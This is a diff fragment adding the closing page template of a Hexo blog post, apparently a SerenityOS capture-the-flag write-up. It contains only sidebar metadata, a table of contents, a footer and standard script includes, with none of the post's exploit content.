+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2021-05-21 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/SerenityOS/">SerenityOS<span>3</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/解题思路/">解题思路<span>3</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Description"><span class="toc-article-text">Description</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Build"><span class="toc-article-text">Build</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Exploiting"><span class="toc-article-text">Exploiting</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x01-Vulnerable"><span class="toc-article-text">0x01 Vulnerable</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x02-Debug"><span class="toc-article-text">0x02 Debug</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x03-Read-flag"><span class="toc-article-text">0x03 Read flag</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Script"><span class="toc-article-text">Script</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2021 sung3r's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
